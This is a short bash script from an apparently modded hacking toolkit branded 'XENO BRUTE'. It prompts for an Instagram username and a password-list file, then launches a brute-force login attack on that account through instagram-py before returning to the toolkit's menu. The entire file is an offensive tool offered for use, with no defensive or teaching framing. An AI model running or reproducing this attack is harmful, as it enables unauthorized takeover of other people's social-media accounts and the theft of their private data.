#!/bin/bash
# Manual Password Attack - Rebranded for XENO BRUTE
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
vlt='\033[1;35m'

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

clear
echo -e "${vlt}
__  __   ____  _   _  ____    ____  ____  _   _ _____ _____ 
\ \/ /  | ____|| \ | |/ __ \  |  _ \|  _ \| | | |_   _| ____|
 \  /   |  _|  |  \| | |  | | | |_) | |_) | | | | | | |  _|  
 /  \   | |___ | |\  | |__| | |  _ <|  _ <| |_| | | | | |___ 
/_/\_\  |_____||_| \_|\____/  |_| \_\_| \_\\___/  |_| |_____|
               [#] Manual Password Attack [#]
${rset}"

printf "\n"
printf "       \e[101m\e[1;77m  >>  Modded By XENO MODZ  << \e[0m\n"
printf "\n"

echo
read -p "[#] Enter Instagram ID/Username : " usrnm
echo
read -p "[#] Enter Password-list path : " inspass
echo

if [ ! -f "$inspass" ]; then
    echo -e "${red}[!] Error: File '$inspass' not found!${rset}"
    sleep 2
    cd "$PROJECT_ROOT"
    bash xeno_brute.sh
    exit 1
fi

echo -e "\e[1;32m[*] Starting attack on $usrnm using $inspass... \e[0m"

instagram-py --username "$usrnm" --password-list "$inspass"

echo
sleep 5
cd "$PROJECT_ROOT"
bash xeno_brute.sh
